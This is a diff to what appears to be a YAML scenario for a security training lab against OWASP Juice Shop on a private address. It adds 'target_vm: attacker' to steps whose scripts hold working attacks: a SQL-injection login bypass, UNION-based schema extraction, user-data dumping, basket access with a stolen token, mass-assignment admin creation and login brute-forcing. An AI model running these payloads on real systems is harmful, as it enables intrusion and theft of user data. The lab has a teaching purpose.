@@ -24,6 +24,7 @@ steps:
     type: output_contains
     expect: API Mapping Complete
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== JuiceShop API Endpoint Map ==='' && for EP in api/Products api/Users api/Feedbacks api/Challenges api/Recycles api/SecurityQuestions rest/products/search rest/user/login rest/track-order;
     do echo -n "/$EP: " && curl -s -o /dev/null -w ''%{http_code}'' http://10.20.30.80:3000/$EP 2>/dev/null && echo ''''; done && echo ''=== API Mapping Complete ==='''
   risk_level: low
@@ -39,6 +40,7 @@ steps:
     type: output_contains
     expect: email
     field: stdout
+  target_vm: attacker
   script: 'curl -s http://10.20.30.80:3000/api/Users/ | python3 -c "import sys,json; data=json.load(sys.stdin).get(''data'',[]); [print(f''User {u.get(\"id\")}: email={u.get(\"email\")}, role={u.get(\"role\",\"N/A\")}'')
     for u in data[:5]]" 2>/dev/null || curl -s http://10.20.30.80:3000/api/Users/ | head -c 500'
   risk_level: medium
@@ -54,6 +56,7 @@ steps:
     type: output_contains
     expect: Basket
     field: stdout
+  target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"''
     -f4) && for i in 1 2 3; do echo "=== Basket $i ===" && curl -s http://10.20.30.80:3000/rest/basket/$i -H "Authorization: Bearer $TOKEN" -o /dev/null -w ''HTTP:%{http_code}'' && echo ''''; done'
   risk_level: medium
@@ -70,6 +73,7 @@ steps:
     type: output_contains
     expect: email
     field: stdout
+  target_vm: attacker
   script: 'curl -s -X POST http://10.20.30.80:3000/api/Users/ -H ''Content-Type: application/json'' -d ''{"email":"massassign_test@test.com","password":"hack1234","passwordRepeat":"hack1234","role":"admin","isAdmin":true}''
     | python3 -c "import sys,json; d=json.load(sys.stdin).get(''data'',{}); print(f''id={d.get(\"id\")}, email={d.get(\"email\")}, role={d.get(\"role\",\"?\")}, isAdmin={d.get(\"isAdmin\",\"?\")}'')" 2>/dev/null
     || curl -s -X POST http://10.20.30.80:3000/api/Users/ -H ''Content-Type: application/json'' -d ''{"email":"massassign_test@test.com","password":"hack1234","passwordRepeat":"hack1234","role":"admin"}'''
@@ -86,6 +90,7 @@ steps:
     type: output_contains
     expect: Rate Limit Test Complete
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Rate Limiting Test (20 attempts) ==='' && for i in $(seq 1 20); do echo -n "Attempt $i: " && curl -s -o /dev/null -w ''%{http_code}'' -X POST http://10.20.30.80:3000/rest/user/login
     -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"wrong_''"$i"''"}'' && echo ''''; done | tail -5 && echo ''=== Rate Limit Test Complete ==='''
   risk_level: medium
@@ -102,6 +107,7 @@ steps:
     type: output_contains
     expect: Auth Test Complete
     field: stdout
+  target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"''
     -f4) && echo ''=== Function Level Auth Test ==='' && for METHOD in GET PUT DELETE OPTIONS; do echo -n "$METHOD /api/Products/1: " && curl -s -o /dev/null -w ''%{http_code}'' -X $METHOD http://10.20.30.80:3000/api/Products/1
     -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" && echo ''''; done && echo ''=== Auth Test Complete ==='''
@@ -117,6 +123,7 @@ steps:
     type: output_contains
     expect: data
     field: stdout
+  target_vm: attacker
   script: curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master+WHERE+type=%27table%27--' | head -c 500
   risk_level: medium
 - order: 8
@@ -132,6 +139,7 @@ steps:
     type: output_contains
     expect: Header Analysis Complete
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== API Security Headers ==='' && curl -sI http://10.20.30.80:3000/api/Products/ | grep -iE ''(access-control|x-content|cache-control|x-frame|strict-transport|content-security)'' && echo
     ''=== CORS Preflight ==='' && curl -sI -X OPTIONS http://10.20.30.80:3000/api/Products/ -H ''Origin: http://evil.com'' -H ''Access-Control-Request-Method: DELETE'' | grep -iE ''(access-control|allow)''
     && echo ''=== Header Analysis Complete ==='''
@@ -148,6 +156,7 @@ steps:
     type: output_contains
     expect: Doc Scan Complete
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== API Documentation Scan ==='' && for PATH in /api-docs /swagger.json /graphql /.well-known/openapi.json /api-docs/swagger.json /v2/api-docs; do CODE=$(curl -s -o /dev/null -w ''%{http_code}''
     http://10.20.30.80:3000$PATH 2>/dev/null); echo "$PATH: $CODE"; done && echo ''=== Doc Scan Complete ==='''
   risk_level: low
@@ -206,6 +215,7 @@ steps:
     type: output_contains
     expect: API 보안 종합 평가 보고서
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/api_report.txt << ''EOF''
 
     === API 보안 종합 평가 보고서 ===
